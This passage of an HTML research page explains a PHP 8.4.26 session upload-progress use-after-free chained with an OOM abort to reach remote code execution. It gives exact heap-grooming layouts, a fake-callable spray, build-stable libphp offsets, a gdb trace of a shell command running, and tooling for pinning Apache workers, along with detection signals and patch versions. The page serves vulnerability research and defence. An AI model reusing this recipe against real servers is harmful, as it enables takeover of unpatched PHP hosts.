+      <dt>Observed</dt><dd>In gdb each OOM shows as a <strong>triple <code>[longjmp]</code></strong>: the first bailout, then cleanup paths that re-allocate while still over the limit and bail again.</dd>
+    </dl>
+    <p class="narrow"><strong>A1</strong> strands <code>PS(id)</code> (bin-64) at <code>id_chunk+0x137000</code> and <code>PS(mod_data)</code> (bin-40) with <code>send_cookie=1</code>. <strong>A2</strong> strands <code>hsv = PS(http_session_vars)</code> at <code>main+0x7D720</code>. Each is the input to the B-stage that reclaims it.</p>
+  </section>
+
+  <!-- ===== 08 grooming ===== -->
+  <section>
+    <p class="snum">08 — Mechanism</p>
+    <h2>Heap grooming, exactly on ZendMM</h2>
+    <p>Grooming = arranging allocations so the reclaim lands where you need it. Here it is, field by field, in ZendMM terms.</p>
+    <figure>
+      <div class="diagram">
+        <svg viewBox="0 0 920 230" role="img" aria-label="The id chunk: G:400 fills pages 1 to 400 with A and a forged zend_string header at page 0x137 where the stale PS(id) points; pages 0x191 to 0x1ff are a Best-Fit hole filled by real arrays carrying zval_ptr_dtor; the cookie reads 0xC8000 bytes from the forged header across both.">
+          <!-- read window bracket -->
+          <text x="555" y="22" style="font:11px var(--mono);fill:var(--accent)">php_url_encode reads 0xC8000 B → Set-Cookie</text>
+          <path d="M555 30 L555 38 L888 38 L888 30" style="fill:none;stroke:var(--accent);stroke-width:1.5"/>
+          <!-- strip -->
+          <rect x="18" y="70" width="692" height="46" style="fill:var(--surface-2);stroke:var(--accent)"/>
+          <rect x="710" y="70" width="194" height="46" style="fill:none;stroke:var(--ok);stroke-dasharray:4 3"/>
+          <text x="360" y="91" style="font:11px var(--mono);fill:var(--fg);text-anchor:middle">G:400 — 'A' fill, pages 1..400</text>
+          <text x="807" y="89" style="font:10px var(--mono);fill:var(--ok);text-anchor:middle">111-pg Best-Fit hole</text>
+          <text x="807" y="103" style="font:10px var(--mono);fill:var(--muted);text-anchor:middle">X:900 real arrays</text>
+          <!-- forged header marker at page 0x137 -->
+          <line x1="555" y1="58" x2="555" y2="126" style="stroke:var(--fault);stroke-width:2"/>
+          <text x="548" y="56" style="font:10px var(--mono);fill:var(--fault);text-anchor:end">forged zend_string @ page 0x137</text>
+          <!-- PS(id) arrow -->
+          <path d="M555 150 L555 118" style="fill:none;stroke:var(--fault);stroke-width:1.5"/>
+          <polygon points="555,116 551,124 559,124" style="fill:var(--fault)"/>
+          <text x="555" y="166" style="font:11px var(--mono);fill:var(--fault);text-anchor:middle">PS(id) — stale from A1 (dangling, len forged 0xC8000)</text>
+          <!-- hole note -->
+          <text x="807" y="150" style="font:10px var(--mono);fill:var(--ok);text-anchor:middle">pDestructor = zval_ptr_dtor</text>
+          <text x="807" y="164" style="font:10px var(--mono);fill:var(--muted);text-anchor:middle">→ libphp = ptr − 0x65EB60</text>
+          <!-- ticks -->
+          <text x="18" y="200" style="font:10px var(--mono);fill:var(--muted)">chunk base (2 MiB-aligned)</text>
+          <text x="904" y="200" style="font:10px var(--mono);fill:var(--muted);text-anchor:end">page 0x1ff (511)</text>
+        </svg>
+      </div>
+      <figcaption><b>fig B</b> · B1's id chunk: the forged string sits where <code>PS(id)</code> dangles; the hole beside it holds real arrays whose <code>pDestructor</code> leaks libphp. One 800KB read captures both.</figcaption>
+    </figure>
+    <h3>B1 — a fake string where <code>PS(id)</code> dangles, libphp pointers beside it</h3>
+    <ul>
+      <li><strong><code>G:511:0x137</code> ×14</strong> — each value is a ~511-page <strong>large run</strong> that fills a whole 2 MiB chunk with <code>'A'</code> and writes a forged <code>zend_string</code> header at <strong>page 0x137</strong>. Fourteen of them pull every cached chunk through this shape, so whichever chunk the stale <code>PS(id)</code> sits in gets the forged header exactly at <code>id_chunk+0x137000</code>. Header fields: <code>refcount 0</code> (RSHUTDOWN's release decrements to <code>0xFFFFFFFF</code>, never frees), <code>IS_STRING</code>, <code>len=0xC8000</code>, data <code>'/..'</code> (so <code>valid_key</code> fails — after the cookie is already out).</li>
+      <li><strong><code>G:400:0x137</code></strong> — same forged header, but fills only pages 1..400, leaving <strong>pages 0x191..0x1ff (111 pages) as a FRUN hole</strong>.</li>
+      <li><strong><code>X:900</code></strong> — 900 real nested arrays. Their <code>HashTable</code>+<code>Bucket</code> backing <strong>Best-Fits into that 111-page hole</strong>, and a real HashTable carries <code>pDestructor = zval_ptr_dtor</code> (a libphp pointer). The <code>0xC8000</code> window from page 0x137 now spans both the chunk-internal pointers (→ chunk base) and those <code>zval_ptr_dtor</code> pointers (→ libphp).</li>
+      <li><strong>Pure-ZendMM survival trick:</strong> releasing the stale <code>basedir</code> string would call <code>zend_string_release</code> on a cached-chunk page and hit <code>zend_mm_panic</code>; the flood values overwrite <code>basedir</code>'s chunk so its <code>refcount</code> reads <code>0x41414141 ≠ 1</code>, making the release a no-op.</li>
+    </ul>
+    <h3>B2 — reclaim the A2 strand with a fake callable</h3>
+    <ul>
+      <li><strong>384-byte spray → bin-448</strong> (smallest bin ≥ 384), each carrying a fake <code>zend_reference</code> every 32 bytes (<code>rc=1</code>, <code>IS_REFERENCE</code>, <code>ptr=S</code>). Because small reuse is <strong>LIFO</strong>, these land on the slot the A2 pointer dangles into, so it now reads as a reference to <code>S = main+0xF8398</code>.</li>
+      <li>The <code>ht</code> field places a fake <code>zend_array</code> at <code>S</code> whose <code>pDestructor = zif_system</code> (<code>libphp+0x465370</code>); request shutdown's <code>zend_hash_destroy</code> calls it over a bucket holding the command string → <code>system()</code>.</li>
+      <li><code>--name-len</code> selects the bin for the spray's own keys (<code>3</code>→bin-32, <code>10</code>→bin-40), used to nudge neighbouring allocations.</li>
+    </ul>
+    <div class="tbox">
+      <table>
+        <caption>PoC field → ZendMM regime → effect</caption>
+        <thead><tr><th>Field</th><th>Size / regime</th><th>Effect on the heap</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">G:511 value</td><td class="mono">~511 pages · large run</td><td>fills a whole chunk; plants forged header at page 0x137</td></tr>
+          <tr><td class="mono">G:400 value</td><td class="mono">~400 pages · large run</td><td>leaves a 111-page Best-Fit hole in the id chunk</td></tr>
+          <tr><td class="mono">X:900 arrays</td><td class="mono">HashTable/Bucket · small+large</td><td>Best-Fit into the hole; bring <code>zval_ptr_dtor</code> into view</td></tr>
+          <tr><td class="mono">384-B spray</td><td class="mono">bin-448 · small LIFO</td><td>reclaims the A2-stranded slot with a fake reference</td></tr>
+          <tr><td class="mono">ht field</td><td class="mono">bin-448</td><td>carries the fake <code>zend_array</code> (pDestructor=system)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ===== 05 gdb verification ===== -->
+  <section>
+    <p class="snum">09 — Evidence</p>
+    <h2>What I verified live, and how</h2>
+    <p>I built a single-worker <code>php:8.4.26-apache</code> target, installed gdb, attached to the worker, and broke on the exported symbols <code>php_url_encode</code>, <code>php_session_reset_id</code>, <code>popen</code> and <code>longjmp</code>, then ran the full chain. The complete trace:</p>
+    <pre><code>[reset_id] entered
+[url_encode] len=0x20 (32)       data@0x7f56d1337018 first=fd0a9543   <span class="c-com"># A1 legit id</span>
+[longjmp] zend bailout (OOM/abort path)   <span class="c-com"># ×3  A1 OOM (CVE-109618)</span>
+[reset_id] entered
+[url_encode] len=<span class="c-f">0xc8000 (819200)</span> data@0x7f56d1337018 first=<span class="c-f">/14BBBBB</span>   <span class="c-com"># B1 OOB read (CVE-109619)</span>
+[reset_id] entered
+[longjmp] zend bailout (OOM/abort path)   <span class="c-com"># ×3  A2 OOM (CVE-109618)</span>
+[reset_id] entered
+[popen] cmd=<span class="c-g">id&gt;/out/p1</span>   <span class="c-com"># B2 RCE</span>
+[Detaching after vfork from child process 417]
+Program received signal SIGSEGV in php_exec () from libphp.so</code></pre>
+    <div class="tbox">
+      <table>
+        <caption>claim → evidence</caption>
+        <thead><tr><th>Claim</th><th>What the trace shows</th></tr></thead>
+        <tbody>
+          <tr><td>OOB read is driven by a forged length (…619)</td><td class="mono">same slot 0x…7018: len 0x20 in A1, len 0xc8000 in B1, data "/14BBBBB"</td></tr>
+          <tr><td>OOM uses a longjmp abort (…618)</td><td class="mono">3× [longjmp] at A1 and again at A2</td></tr>
+          <tr><td>control reaches a shell</td><td class="mono">[popen] cmd=id&gt;/out/p1</td></tr>
+          <tr><td>leaked libphp base is correct</td><td class="mono">0x7f56d3647000 + 0x4bc590 = gdb BP php_url_encode</td></tr>
+          <tr><td>destructor really is the system handler</td><td class="mono">crash in php_exec @ libphp+0x464f6c, 0x404 below zif_system</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="narrow">Everything here comes from the stock image plus exported symbols — no debug build, no trusting the research notes. The chunked <code>post_max_size</code> bypass is the one claim I did not separately instrument; it follows directly from the single gate at <span class="src">rfc1867.c:697</span> comparing only <code>content_length</code>, and the whole chain runs chunked.</p>
+  </section>
+
+  <!-- ===== 06 memory map ===== -->
+  <section>
+    <p class="snum">10 — Reference</p>
+    <h2>Addresses and offsets</h2>
+    <p>Absolute addresses are one ASLR instance (the gdb run); the <strong>offsets are stable for this build</strong> and are what the exploit computes at runtime from the B1 leak.</p>
+    <div class="tbox">
+      <table>
+        <caption>offsets (build-stable) and one instance's absolutes</caption>
+        <thead><tr><th>Symbol / location</th><th>Offset</th><th>This run</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">libphp base</td><td class="mono">— (leaked)</td><td class="mono">0x7f56d3647000</td></tr>
+          <tr><td class="mono">zval_ptr_dtor</td><td class="mono">libphp+0x65EB60</td><td class="mono">0x7f56d3ca5b60</td></tr>
+          <tr><td class="mono">php_url_encode</td><td class="mono">libphp+0x4BC590</td><td class="mono">0x7f56d3b03590</td></tr>
+          <tr><td class="mono">zif_system</td><td class="mono">libphp+0x465370</td><td class="mono">0x7f56d3aac370</td></tr>
+          <tr><td class="mono">main chunk</td><td class="mono">— (leaked)</td><td class="mono">0x7f56d1a00000</td></tr>
+          <tr><td class="mono">fake array S</td><td class="mono">main+0xF8398</td><td class="mono">0x7f56d1af8398</td></tr>
+          <tr><td class="mono">A2 stranded ptr</td><td class="mono">main+0x7D720</td><td class="mono">—</td></tr>
+          <tr><td class="mono">forged id / read start</td><td class="mono">id_chunk+0x137018</td><td class="mono">0x7f56d1337018</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ===== 07 components ===== -->
+  <section>
+    <p class="snum">11 — Reference</p>
+    <h2>Who processes what</h2>
+    <div class="tbox">
+      <table>
+        <caption>component responsibilities</caption>
+        <thead><tr><th>Component</th><th>Processes</th><th>Role</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">Apache mpm_prefork</td><td>connections → children</td><td>concurrency cap the pin exploits</td></tr>
+          <tr><td class="mono">mod_reqtimeout</td><td>request read rate</td><td>reaps idle holders at 10s; keepalive beats it</td></tr>
+          <tr><td class="mono">SAPI read_post</td><td>raw body</td><td>feeds the multipart stream to the handler</td></tr>
+          <tr><td class="mono">rfc1867_post_handler</td><td>multipart parse</td><td>the <code>post_max_size</code> gate, part loop, callback events</td></tr>
+          <tr><td class="mono">php_session_rfc1867_callback</td><td>START/FORMDATA/FILE_*/END</td><td>owns <code>PS(rfc1867_progress)</code>, <code>PS(id)</code>, cookie send</td></tr>
+          <tr><td class="mono">php_url_encode</td><td><code>ZSTR_VAL/LEN(PS(id))</code></td><td>the forged-length OOB read</td></tr>
+          <tr><td class="mono">session save handler</td><td><code>s_open/s_read</code></td><td>opens the attacker-named record (files handler)</td></tr>
+          <tr><td class="mono">Zend MM</td><td>heap + <code>memory_limit</code></td><td>the OOM <code>longjmp</code>; arena teardown frees the stale block</td></tr>
+          <tr><td class="mono">zend shutdown</td><td>request teardown</td><td>fires the fake array's destructor → <code>system()</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ===== 08 vuln core ===== -->
+  <section>
+    <p class="snum">12 — The bug</p>
+    <h2>The invariant the chain breaks</h2>
+    <p>Two sites touch <code>PS(rfc1867_progress)</code> and neither per-request hook is one of them — confirmed in 8.4.26:</p>
+    <div class="cols">
+      <div class="card fault">
+        <span class="lbl">blind to it</span><h4>RINIT / RSHUTDOWN</h4>
+        <p style="font-size:13.5px;margin:0"><code>php_rinit_session_globals</code> <span class="src">:108</span> clears <code>id</code>, <code>mod_data</code>, <code>session_vars</code>… but not <code>rfc1867_progress</code>. <code>php_rshutdown_session_globals</code> <span class="src">:136</span> dtors vars, closes the handler, releases <code>id</code>… but not <code>rfc1867_progress</code>.</p>
+      </div>
+      <div class="card ok">
+        <span class="lbl">owns it</span><h4>Callback START / END</h4>
+        <p style="font-size:13.5px;margin:0">Only <code>EVENT_START</code> allocates (<code>ecalloc</code> + set global, <span class="src">:3238</span>) and only <code>EVENT_END</code> frees+nulls (<code>efree(progress); PS(rfc1867_progress)=NULL</code>, <span class="src">:3387–3392</span>). Abort before END and the memory is freed but the global still points at it.</p>
+      </div>
+    </div>
+    <p class="narrow">That is …619. …618 is the <code>longjmp</code> that makes aborting-before-END easy and routine. The fix (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35, 21 Oct 2026): …618 stops the request at a safe point instead of <code>longjmp</code>-ing mid-operation; …619 restores the reset so progress state cannot outlive its memory.</p>
+  </section>
+
+  <!-- ===== 09 our fork ===== -->
+  <section>
+    <p class="snum">13 — Our fork</p>
+    <h2>What we added, and the lab result</h2>
+    <p>Three additions over 9bie's PoC, each forced by a component above.</p>
+    <ul>
+      <li><strong>Auto worker discovery (<code>--workers auto</code>).</strong> Pinning needs the child count N. A fresh request is served only if a child is free, so the holder count at which a probe first stalls is N; found in O(log N) by exponential ramp then binary search, then hold N−1.</li>
+      <li><strong>Holder keepalive.</strong> <code>mod_reqtimeout</code> (<code>body=10,minrate=500</code>) reaps a one-byte holder after ~10s; a background thread drip-feeds ~1.3&nbsp;KB/s per holder so the pin survives a slower auto-discovery run.</li>
+      <li><strong>Lab harness (<code>lab/labtest.sh</code>).</strong> Stock target, N runs with fresh ASLR each, success via the in-container proof file, <code>-w N</code> for an arbitrary worker count, <code>-w auto</code> to drive discovery.</li>
+    </ul>
+    <div class="tiles">
+      <div class="tile good"><div class="k">explicit 150</div><div class="v">7/8</div><div class="s">88% to RCE · ~3–4s each</div></div>
+      <div class="tile good"><div class="k">auto · N=16</div><div class="v">11s</div><div class="s">discovered 16, held 15</div></div>
+      <div class="tile good"><div class="k">auto · N=150</div><div class="v">36s</div><div class="s">discovered 150, held 149</div></div>
+      <div class="tile"><div class="k">proof</div><div class="v" style="font-size:15px;line-height:1.4">uid=33<br>(www-data)</div><div class="s">command ran in-worker</div></div>
+    </div>
+  </section>
+
+  <!-- ===== 10 detection ===== -->
+  <section>
+    <p class="snum">14 — Defense</p>
+    <h2>Detection &amp; patch</h2>
+    <div class="cols">
+      <div class="card">
+        <h4>Observable from this exploit</h4>
+        <ul style="margin:0">
+          <li><code>Set-Cookie: PHPSESSID=</code> far longer than 32 chars (B1 emits ~1.5–2.3&nbsp;MB)</li>
+          <li><code>PHPSESSID</code> sent as a POST <em>field</em>, not a Cookie header</li>
+          <li>memory-exhausted fatal with no script/line; the OOM <code>longjmp</code></li>
+          <li>a burst of long-lived incomplete POSTs (the pin) then a PHP worker spawning <code>sh</code>/<code>id</code></li>
+        </ul>
+      </div>
+      <div class="card ok">
+        <span class="lbl">patch</span><h4>Fixed 21 Oct 2026</h4>
+        <p style="font-size:13.5px;margin:0">8.5.12 / 8.4.27 / 8.3.36 / 8.2.35. <code>upload_progress.enabled=0</code> and <code>memory_limit=-1</code> only reduce exposure; only the patch closes both bugs.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== appendix ===== -->
+  <section>
+    <p class="snum">A — Appendix</p>
+    <h2>Original analysis diagrams</h2>
+    <p>The eight source-level diagrams from the analysis pack, kept for reference. The per-stage diagrams above supersede them for the request-and-heap flow.</p>
+    <div class="gallery">
+      <figure><div class="diagram"><img src="diagrams/1_request_lifecycle.svg" alt="End-to-end request lifecycle with detection signals."></div><figcaption><b>1</b> · request lifecycle</figcaption></figure>
+      <figure><div class="diagram"><img src="diagrams/2_call_chain_constants.svg" alt="The call chain annotated with source constants."></div><figcaption><b>2</b> · call chain + constants</figcaption></figure>
+      <figure><div class="diagram"><img src="diagrams/3_stale_global_lifecycle.svg" alt="PS(rfc1867_progress) across two requests."></div><figcaption><b>3</b> · stale-global lifecycle</figcaption></figure>
+      <figure><div class="diagram"><img src="diagrams/4_reset_gap.svg" alt="The free-versus-reset gap timeline."></div><figcaption><b>4</b> · free-vs-reset gap</figcaption></figure>
+      <figure><div class="diagram"><img src="diagrams/5_session_crossing.svg" alt="Where the callback crosses into the session subsystem."></div><figcaption><b>5</b> · session crossing</figcaption></figure>
+      <figure><div class="diagram"><img src="diagrams/6_request_ladder.svg" alt="Attacker/worker request-response ladder."></div><figcaption><b>6</b> · request ladder</figcaption></figure>
+      <figure><div class="diagram"><img src="diagrams/7_poc_mapping.svg" alt="Public PoC architecture mapped to the traces."></div><figcaption><b>7</b> · PoC mapping</figcaption></figure>
+      <figure><div class="diagram"><img src="diagrams/8_uaf_reclaim_concept.svg" alt="One heap slot through use-after-free and reclaim."></div><figcaption><b>8</b> · UAF reclaim concept</figcaption></figure>
+    </div>
+  </section>
+
+  <footer>
+    <p class="kicker">source · php-8.4.26 · and our fork</p>
+    <ul class="refs">
+      <li><code>main/rfc1867.c</code> — handler:651, post_max_size:697, FILLUNIT:184</li>
+      <li><code>ext/session/session.c</code> — callback:3221, START:3238, END free:3387, reset_id:1552, send_cookie:1447, valid_key:359, rinit:108, rshutdown:136</li>
+      <li><code>ext/session/php_session.h</code> — progress struct:122, global:193</li>
+      <li><code>Zend/zend_alloc.c</code> — safe_error:401, "exhausted":1049</li>
+      <li>PoC: <code>exploit.py</code> + <code>pure/{mk_a1,mk_leak_b,cheap_oom_a,mk_ht,fake_ref_b,chunked_send,decode_cookie}.py</code></li>
+      <li>evidence: <code>analysis/gdb_trace_verified.log</code> (this session)</li>
+    </ul>
+    <p style="margin-top:18px">Grounded in the php-8.4.26 source and a live gdb trace of the running worker. Authorized defensive research only.</p>
+  </footer>
+</div>
